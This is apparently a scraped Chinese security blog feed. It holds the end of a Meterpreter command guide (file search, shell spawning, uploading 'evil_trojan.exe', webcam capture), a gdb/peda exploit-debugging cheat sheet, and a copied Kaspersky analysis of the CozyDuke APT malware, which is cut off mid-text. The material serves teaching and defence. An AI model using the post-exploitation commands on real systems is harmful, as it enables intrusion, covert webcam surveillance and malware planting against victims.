exploit(handler) &gt;</span><br></pre></td></tr></table></figure><h2 id="SEARCH"><a href="#SEARCH" class="headerlink" title="SEARCH"></a>SEARCH</h2><p>在目标机上搜索具体的文件，可以在整个系统中搜索，也可以在指定的目录下搜索，在创建文件模式时可以使用通配符。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search</span><br><span class="line">[-] You must specify a valid file glob to search <span class="keyword">for</span>, e.g. &gt;search -f *.doc</span><br></pre></td></tr></table></figure><p>参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File pattern: May contain wildcards</span><br><span class="line">Search location:Optional, <span class="keyword">if</span> none is given the whole system will be searched.</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; search -f autoexec.bat</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\AUTOEXEC.BAT</span><br><span class="line">meterpreter &gt; search -f sea*.bat c:\\xamp\\</span><br><span class="line">Found 1 result...</span><br><span class="line">    c:\\xampp\perl\bin\search.bat (57035 bytes)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h2><p>返回目标机上的一个标准的shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 39640 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure><h2 id="UPLOAD"><a href="#UPLOAD" class="headerlink" title="UPLOAD"></a>UPLOAD</h2><p>上传文件到目标机上，同<strong>download</strong> 命令一样在路径中需要使用两个反斜杠：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload evil_trojan.exe c:\\windows\\system32</span><br><span class="line">[*] uploading  : evil_trojan.exe -&gt; c:\windows\system32</span><br><span class="line">[*] uploaded   : evil_trojan.exe -&gt; c:\windows\system32\evil_trojan.exe</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="WEBCAM-LIST"><a href="#WEBCAM-LIST" class="headerlink" title="WEBCAM_LIST"></a>WEBCAM_LIST</h2><p>列出当前目标机器上可用的Webcam设备。</p><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: Creative WebCam NX Pro</span><br><span class="line">2: Creative WebCam NX Pro (VFW)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="WEBCAM-SNAP"><a href="#WEBCAM-SNAP" class="headerlink" title="WEBCAM_SNAP"></a>WEBCAM_SNAP</h2><p>利用已连接的webcam设备在目标机上截屏并以随机文件名的jpg格式保存在本地当前工作目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -h</span><br><span class="line">Usage: webcam_snap [options]</span><br><span class="line">Grab a frame from the specified webcam.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -h      Help Banner</span><br><span class="line">    -i   要使用的webcam设备的编号(Default: 1)</span><br><span class="line">    -p   jpg图片的路径 (Default: <span class="string">&#x27;gnFjTnzi.jpeg&#x27;</span>)</span><br><span class="line">    -q   jpg图片的质量 (Default: <span class="string">&#x27;50&#x27;</span>)</span><br><span class="line">    -v   是否自动查看图片 (Default: <span class="string">&#x27;true&#x27;</span>)</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>选项:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-h:Displays the help information for the command</span><br><span class="line">-i opt:If more then 1 web cam is connected, use this option to select the device to capture the</span><br><span class="line">        image from</span><br><span class="line">-p opt:Change path and filename of the image to be saved</span><br><span class="line">-q opt:The imagine quality, 50 being the default&#x2F;medium setting, 100 being best quality</span><br><span class="line">-v opt:By default the value is true, which opens the image after capture.</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_snap -i 1 -v false</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: &#x2F;root&#x2F;Offsec&#x2F;YxdhwpeQ.jpeg</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> meterpreter </tag>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn tips in gdb</title>
      <link href="2019/12/28/pwn_tips/"/>
      <url>2019/12/28/pwn_tips/</url>
      
        <content type="html"><![CDATA[<p>不是原创，借鉴别人整理的。</p><h3 id="1-调试的快捷键"><a href="#1-调试的快捷键" class="headerlink" title="1. 调试的快捷键"></a>1. 调试的快捷键</h3><p>peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</p><h4 id="1-1-基础的调试快捷键"><a href="#1-1-基础的调试快捷键" class="headerlink" title="1.1 基础的调试快捷键"></a>1.1 基础的调试快捷键</h4><ul><li>s step，si步入</li><li>n 执行下一条指令 ni步入</li><li>b 在某处下断点，可以用<ul><li>b * adrress</li><li>b function_name</li><li>info b 查看断点信息</li><li>delete 1删除第一个断点</li></ul></li><li>c 继续</li><li>r 执行</li><li>disas addr 查看addr处前后的反汇编代码，也可以是函数名字</li></ul><h4 id="1-2-显示数据"><a href="#1-2-显示数据" class="headerlink" title="1.2 显示数据"></a>1.2 显示数据</h4><h5 id="p-系列"><a href="#p-系列" class="headerlink" title="p 系列"></a>p 系列</h5><ul><li>p system/main 显示某个函数地址<pre><code>- p $esp 显示寄存器</code></pre></li><li>p/x p/a p/b p/s。。。</li><li>p 0xff - 0xea 计算器</li><li>print &amp;VarName 查看变量地址</li><li>p * 0xffffebac 查看某个地址处的值</li></ul><h5 id="x系列"><a href="#x系列" class="headerlink" title="x系列"></a>x系列</h5><ul><li>x/ [n] &lt;b|w|g|s|i&gt; addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表,其中b代表一个字符为一组，w代表4个字节为一组，g代表8个字节为一组，s代表“\x00”结尾的字符串，i代表指令。</li><li>x/w $esp 查看esp寄存器中的值</li><li>x/s addr 查看addr处的字符串</li><li>x/b addr 查看addr处的字符</li><li>x/i addr 查看addr处的反汇编结果</li></ul><h5 id="info系列"><a href="#info系列" class="headerlink" title="info系列"></a>info系列</h5><ul><li>info register $ebp 查看寄存器ebp中的内容 (简写为 i r ebp)</li><li>i r eflags 查看状态寄存器</li><li>i r ss 查看段寄存器</li><li>i b 查看断点信息</li><li>i functions 查看所有的函数</li></ul><p>disas addr 查看addr处前后的反汇编代码</p><p>stack 20 查看栈内20个值</p><p>show args 查看参数</p><p>vmmap 查看映射状况 peda带有</p><p>readelf 查看elf文件中各个段的起始地址 peda带有</p><p>parseheap 显示堆状况 peda带有</p><h4 id="1-3-查找数据"><a href="#1-3-查找数据" class="headerlink" title="1.3 查找数据"></a>1.3 查找数据</h4><ul><li>find 查找字符串 peda带有</li><li>searchmem 查找字符串 peda带有</li><li>ropsearch “xor eax,eax;ret” 0x08048080 0x08050000 查找某段的rop peda带有</li><li>ropgadget 提供多个pop|ret可行结果 peda带有</li></ul><h4 id="1-4-修改数据"><a href="#1-4-修改数据" class="headerlink" title="1.4 修改数据"></a>1.4 修改数据</h4><ul><li>set $esp=0x110 修改寄存器的值</li><li>set *0xf7ff3234=0x08042334 修改内存的值</li><li>set args “asdasg” “afdasgasg” “agasdsa” 分别给参数1,2,3赋值</li><li>set args “<code>python -c &#39;print &quot;1234\x7f\xde&quot;&#39;</code>“ 这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li><li>r “arg1” “arg2” “arg3” 设置参数</li><li>run <code>$(perl -e &#39;print &quot;A&quot;x20&#39;)</code></li></ul><h4 id="1-5-peda插件"><a href="#1-5-peda插件" class="headerlink" title="1.5 peda插件"></a>1.5 peda插件</h4><p>Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.<br>Add commands to support debugging and exploit development (for a full list of commands use peda help):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">aslr -- Show/<span class="built_in">set</span> ASLR setting of GDB</span><br><span class="line">checksec -- Check <span class="keyword">for</span> various security options of binary</span><br><span class="line">dumpargs -- Display arguments passed to a <span class="keyword">function</span> when stopped at a call instruction</span><br><span class="line">dumprop -- Dump all ROP gadgets <span class="keyword">in</span> specific memory range</span><br><span class="line">elfheader -- Get headers information from debugged ELF file</span><br><span class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</span><br><span class="line">lookup -- Search <span class="keyword">for</span> all addresses/references to addresses <span class="built_in">which</span> belong to a memory range</span><br><span class="line">patch -- Patch memory start at an address with string/hexstring/int</span><br><span class="line">pattern -- Generate, search, or write a cyclic pattern to memory</span><br><span class="line">procinfo -- Display various info from /proc/pid/</span><br><span class="line">pshow -- Show various PEDA options and other settings</span><br><span class="line">pset -- Set various PEDA options and other settings</span><br><span class="line">readelf -- Get headers information from an ELF file</span><br><span class="line">ropgadget -- Get common ROP gadgets of binary or library</span><br><span class="line">ropsearch -- Search <span class="keyword">for</span> ROP gadgets <span class="keyword">in</span> memory</span><br><span class="line">searchmem|find -- Search <span class="keyword">for</span> a pattern <span class="keyword">in</span> memory; support regex search</span><br><span class="line">shellcode -- Generate or download common shellcodes.</span><br><span class="line">skeleton -- Generate python exploit code template</span><br><span class="line">vmmap -- Get virtual mapping address ranges of section(s) <span class="keyword">in</span> debugged process</span><br><span class="line">xormem -- XOR a memory region with a key</span><br><span class="line">Installation</span><br></pre></td></tr></table></figure><p>vmmap：查看当前程序映射的内存块<br>dumprop：</p><h3 id="2-查找某个plt、got、plt-2"><a href="#2-查找某个plt、got、plt-2" class="headerlink" title="2.查找某个plt、got、plt_2"></a>2.查找某个plt、got、plt_2</h3><ul><li><p>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</p></li><li><p>got 可以直接使用pwntools中的ELF(elf).got(function_name)</p></li><li><p>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</p></li></ul><h3 id="3-查找程序所动态链接的库"><a href="#3-查找程序所动态链接的库" class="headerlink" title="3.查找程序所动态链接的库"></a>3.查找程序所动态链接的库</h3><ul><li>file pwn3<ul><li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li></ul></li><li>checksec pwn3<ul><li>[*] ‘/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3’<br>Arch: i386-32-little<br>RELRO: Partial RELRO<br>Stack: No canary found<br>NX: NX enabled<br>PIE: No PIE (0x8048000)</li></ul></li><li>ldd pwn3<ul><li>linux-gate.so.1 (0xf77ad000)<br>libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>/lib/ld-linux.so.2 (0x56601000)</li></ul></li></ul><h3 id="4-编译32位可执行文件"><a href="#4-编译32位可执行文件" class="headerlink" title="4.编译32位可执行文件"></a>4.编译32位可执行文件</h3><ul><li><p>gcc -m32 test.c -o test</p><ul><li>一般而言此时的目标文件为32位，且不能生成调试信息</li></ul></li><li><p>gcc -m32 -g test.c -o test</p><ul><li>生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息</li></ul></li><li><p>其它保护状态的开启，请参考linux程序的常用保护机制</p></li></ul><h3 id="5-开启PIE之后的调试"><a href="#5-开启PIE之后的调试" class="headerlink" title="5.开启PIE之后的调试"></a>5.开启PIE之后的调试</h3><p>开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR</p><ul><li>常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space</li></ul><ul><li>开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space</li></ul><h3 id="6-运行时查看文件执行"><a href="#6-运行时查看文件执行" class="headerlink" title="6.运行时查看文件执行"></a>6.运行时查看文件执行</h3><p>做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。</p><p>这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法：</p><ul><li>执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID</li><li>编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址</li></ul><h3 id="7-One-gadget的安装"><a href="#7-One-gadget的安装" class="headerlink" title="7.One_gadget的安装"></a>7.One_gadget的安装</h3><p>现在one_gadget需要ruby2.4及以上，而apt安装的是2.3，所以需要到ruby官网去下载源码来安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ruby/</span><br><span class="line">./configure</span><br><span class="line">make -j4</span><br><span class="line">sudo make install</span><br><span class="line">ruby -v <span class="comment">#查看ruby版本信息</span></span><br><span class="line">gem install one_gadget <span class="comment">#通过gem包管理工具安装one_gadget</span></span><br><span class="line">one_gadget &lt;libc.so&gt; <span class="comment"># 使用方式</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The CozyDuke APT&#39;s analysis</title>
      <link href="2019/12/20/The-CozyDuke-APT-s-analysis/"/>
      <url>2019/12/20/The-CozyDuke-APT-s-analysis/</url>
      
        <content type="html"><![CDATA[<h3 id="Prefix"><a href="#Prefix" class="headerlink" title="Prefix"></a>Prefix</h3><p>This article is copied from Kaspersky‘s <a href="https://securelist.com/the-cozyduke-apt/69731/">site</a>, which just for learning. It’s an analysis of the <code>HEUR:Trojan.Win32.CozyDuke.gen</code> and <code>Trojan.Win32.CozyBear.*</code>.</p><h1 id="The-CozyDuke-APT"><a href="#The-CozyDuke-APT" class="headerlink" title="The CozyDuke APT"></a>The CozyDuke APT</h1><p>By <a href="https://securelist.com/author/kurtb/">Kurt Baumgartner</a>, <a href="https://securelist.com/author/costin/">Costin Raiu</a> on April 21, 2015. 8:50 pm</p><p>CozyDuke (aka CozyBear, CozyCar or “Office Monkeys”) is a precise attacker. Kaspersky Lab has observed signs of attacks against government organizations and commercial entities in the US, Germany, South Korea and Uzbekistan. In 2014, targets included the White House and the US Department of State, as believed.</p><p>The operation presents several interesting aspects</p><ul><li>extremely sensitive high profile victims and targets</li><li>evolving crypto and anti-detection capabilities</li><li>strong malware functional and structural similarities mating this toolset to early MiniDuke second stage components, along with more recent CosmicDuke and OnionDuke components</li></ul><p>The actor often spearphishes targets with e-mails containing a link to a hacked website. Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive. The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy.</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061845/monkeys.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061845/monkeys.png" alt="monkeys"></a></p><p>In other highly successful runs, this actor sends out phony flash videos directly as email attachments. A clever example is “Office Monkeys LOL Video.zip”. The executable within not only plays a flash video, but drops and runs another CozyDuke executable. These videos are quickly passed around offices with delight while systems are infected in the background silently. Many of this APT’s components are signed with phony Intel and AMD digital certificates.</p><p>Recent CozyDuke APT activity attracted significant attention in the news:</p><p><a href="http://www.cnn.com/2015/03/10/politics/state-department-hack-worst-ever/">Sources: State Dept. hack the ‘worst ever’</a>, CNN News, March 2015<br><a href="http://www.bbc.com/news/technology-29817644">White House computer network ‘hacked’</a>, BBC News, October 2014<br><a href="http://www.wsj.com/articles/three-months-later-state-department-hasnt-rooted-out-hackers-1424391453">Three Months Later, State Department Hasn’t Rooted Out Hackers</a>, Wall Street Journal, February 2015<br><a href="http://www.washingtonpost.com/world/national-security/state-department-shuts-down-its-e-mail-system-amid-concerns-about-hacking/2014/11/16/92cf0722-4815-41ca-b602-9bfe8ecdb256_story.html">State Department shuts down its e-mail system amid concerns about hacking</a>, Washington Post, November 2014</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061725/CozyDuke_map.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061725/CozyDuke_map.png" alt="CozyDuke_map"></a></p><p>Let’s examine a smattering of representative CozyDuke files and data. There is much to their toolset.</p><h3 id="Office-Monkeys-dropper-analysis"><a href="#Office-Monkeys-dropper-analysis" class="headerlink" title="Office Monkeys dropper analysis"></a>Office Monkeys dropper analysis</h3><p>CozyDuke droppers and spyware components often maintain fairly common characteristics, but these files’ functionality are modified in slight ways depending on the team’s needs. This rapid development and deployment is interesting.</p><p>68271df868f462c06e24a896a9494225,<strong>Office Monkeys LOL Video.zip</strong></p><p>Believe it or not, recipients in bulk run the file within:</p><p>95b3ec0a4e539efaa1faa3d4e25d51de,<strong>Office Monkeys (Short Flash Movie).exe</strong></p><p>This file in turn drops two executables to %temp%:</p><ul><li>2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe</li><li>3d3363598f87c78826c859077606e514, player.exe</li></ul><p>It first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague. It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques:</p><p>3d3363598f87c78826c859077606e514,player.exe,338kb,Trojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33</p><h3 id="Anti-detection-and-trojan-functionality"><a href="#Anti-detection-and-trojan-functionality" class="headerlink" title="Anti-detection and trojan functionality"></a>Anti-detection and trojan functionality</h3><p>The file collects system information, and then invokes a WMI instance in the rootsecuritycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here:</p><p>SELECT * FROM AntiVirusProduct<br>SELECT * FROM FireWallProduct</p><p>The code hunts for several security products to evade:</p><ul><li>CRYSTAL</li><li>KASPERSKY</li><li>SOPHOS</li><li>DrWeb</li><li>AVIRA</li><li>COMODO Dragon</li></ul><p>In addition to the WMI/wql use, it also hunts through the “SOFTWAREMicrosoftWindowsCurrentVersionUninstall” registry key looking for security products to avoid. Following these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates. These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”. The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: x36x11xddx08xacx4bx72xf8x51x04x68x2ex3ex38x64x32.</p><p>The cab file is decompressed and its contents are created on disk. These dropped files bundle functionality for both 64bit and 32bit Windows systems and are all located within one directory:<br>C:\Documents and Settings\userApplication Data\ATI_Subsystem</p><p>6761106f816313394a653db5172dc487,amdhcp32.dll,54kb  ← 32bit dll,CompiledOn:2014.07.02 21:13:24<br>d596827d48a3ff836545b3a999f2c3e3,aticaldd.dll,60kb  ← 64bit dll,CompiledOn:2014.07.02 21:13:26<br>bc626c8f11ed753f33ad1c0fe848d898,atiumdag.dll,285kb ← 32bit dll, Trojan.Win32.CozyDuke.a, CompiledOn:2014.07.02 21:13:26<br>4152e79e3dbde55dcf3fc2014700a022,6kb,racss.dat</p><p>The code copies rundll32.exe from windows\system32 to its newly created %appdata%ATI_Subsystem subdirectory as “amdocl_as32.exe” alongside the three dll’s listed above. It runs atiumdag.dll with two parameter values, it’s only export and an arbitrary pid,  i.e.:<br>“C:\Documents and Settings\userApplication Data\ATI_Subsystem\amdocl_as32.exe” “C:Documents and SettingsuserApplication DataATI_Subsystematiumdag.dll””, ADL2_ApplicationProfiles_System_Reload 1684″</p><p>This dll is built with anti-AV protections as well. However, it looks for a different but overlapping set, and the random duplication suggests that this component was cobbled together with its dropper, partly regionally based on target selection.</p><ul><li>K7</li><li>KASPERSKY</li><li>AVG</li></ul><p>The code collects information about the system and xml formats this data prior to encryption for proper parsing:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061738/collectedSystemInfo.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061738/collectedSystemInfo.png" alt="collectedSystemInfo"></a></p><p>Finally, this process beacons to <code>www.sanjosemaristas[.]com</code>, which appears to be a site that has been compromised and misused multiple times in the past couple of years.<br>hxxp://<a href="http://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}">www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}</a>, providing the current network adapter’s service name GUID. It uses standard Win32 base cryptography functions to generate a CALG_RC4 session key to encrypt the collected data communications and POSTs it to the server.</p><h3 id="Executable-Signing-Certificates"><a href="#Executable-Signing-Certificates" class="headerlink" title="Executable-Signing Certificates"></a>Executable-Signing Certificates</h3><p>Samples are usually signed with a fake certificate – we’ve seen two instances, one AMD and one Intel:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061840/FakeCerts.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061840/FakeCerts.png" alt="FakeCerts"></a></p><h3 id="Configuration-files"><a href="#Configuration-files" class="headerlink" title="Configuration files:"></a>Configuration files:</h3><p>Some of the malware uses an encrypted configuration file which is stored on disk as “racss.dat”. This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}. Here’s how it looks decrypted:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061836/CDconfig.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061836/CDconfig.png" alt="CDconfig"></a></p><h3 id="Second-stage-malware-and-communications"><a href="#Second-stage-malware-and-communications" class="headerlink" title="Second stage malware and communications:"></a>Second stage malware and communications:</h3><p>The attackers send commands and new modules to be executed to the victims through the C&amp;Cs. The C&amp;C scripts store these temporarily until the victim next connects to retrieve local files. We’ve identified two such files:</p><ul><li>settings.db</li><li>sdfg3d.db</li></ul><p>Here’s how such a database file appears:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061832/db.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061832/db.png" alt="db"></a></p><p>These are BASE64 encoded and use the same RC4 encryption key as the malware configuration.</p><p>Decoding them resulted in the following payloads:</p><p>59704bc8bedef32709ab1128734aa846, ChromeUpdate.ex_<br>5d8835982d8bfc8b047eb47322436c8a, cmd_task.dll<br>e0b6f0d368c81a0fb197774d0072f759, screenshot_task.dll</p><p>Decoding them also resulted in a set of tasking files maintaining agent commands and parameter values:</p><p>conf.xml</p><p>And a set of “reporting” files, maintaining stolen system “info”, error output, and “AgentInfo” output, from victim systems:</p><p>DCOM_amdocl_ld_API_.raw<br>Util_amdave_System_.vol<br>Last_amdpcom_Subsystem_.max<br>Data_amdmiracast_API_.aaf<br>7.txt</p><p>screenshot_task.dll is a 32-bit dll used to take a screenshot of the full desktop window and save it as a bitmap in %temp%. The number of times the screenshot is repeated is configurable within the xml task file.</p><p>cmd_task.dll is a 32-bit dll that maintains several primitives. It is used to create new processes, perform as a command line shell, and several other tasks.</p><p>Each of these payloads is delivered together with a configuration file that explains how to run it, for instance:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061810/decodedConfig.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061810/decodedConfig.png" alt="decodedConfig"></a><br>In another tasking, we notice a tracked victim:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061756/victimTask.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061756/victimTask.png" alt="victimTask"></a></p><p>Attackers map a network drive use Microsoft OneDrive to run further tools:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061752/victimOneDrive.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061752/victimOneDrive.png" alt="victimOneDrive"></a></p><p>They copy down a base64 encoded document from Microsoft OneDrive to the victim system and decode it there:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061748/victimDecode.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061748/victimDecode.png" alt="victimDecode"></a></p><p>Not everything works as planned, so they maintain error reporting facility for the c2 communications:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061742/victimErrors.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061742/victimErrors.png" alt="victimErrors"></a></p><p>Furthermore, ChromeUpdate is a 64-bit executable (which appears to be a WEXTRACT package) that oddly drops a 32-bit Dll. Cache.dll is simply stored as a cabinet file in the ChromeUpdate’s resource section.</p><p>ChromeUpdate.exe starts the file with “rundll32 cache.dll,ADB_Setup”</p><h3 id="Cache-dll-analysis"><a href="#Cache-dll-analysis" class="headerlink" title="Cache.dll analysis"></a>Cache.dll analysis</h3><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061828/cachetable.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061828/cachetable.png" alt="cachetable"></a></p><p>Cache.dll was written in C/C++ and built with a Microsoft compiler.</p><p>Cache.dll code flow overview</p><ul><li>RC4 decrypt hardcoded c2 and urls</li><li>resolve hidden function calls</li><li>collect identifying victim system data</li><li>encrypt collected data</li><li>send stolen data to c2 and retrieve commands</li></ul><h3 id="Cache-dll-code-details"><a href="#Cache-dll-code-details" class="headerlink" title="Cache.dll code details"></a>Cache.dll code details</h3><p>Structurally, “Cache.dll” is a fairly large backdoor at 425KB. It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn’t exposed until runtime. No pdb/debug strings are present in the code.</p><p>It maintains eight exports, including DllMain:</p><ul><li>ADB_Add</li><li>ADB_Cleanup</li><li>ADB_Initnj</li><li>ADB_Load</li><li>ADB_Release</li><li>ADB_Remove</li><li>ADB_Setup</li></ul><p>ADB_Setup is a entry point that simply spawns another thread and waits for completion.</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061824/CacheDLL_ADB_Setup.png"><img src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061824/CacheDLL_ADB_Setup.png" alt="CacheDLL_ADB_Setup"></a></p><p>Above, we see a new thread created with the start address of Cache.dll export  “ADB_Load” by the initial thread.</p><p>This exported function is passed control while the initial thread runs a Windows message loop. It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:</p><p><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2015/04/08061820/cryptedBlob.png"><img 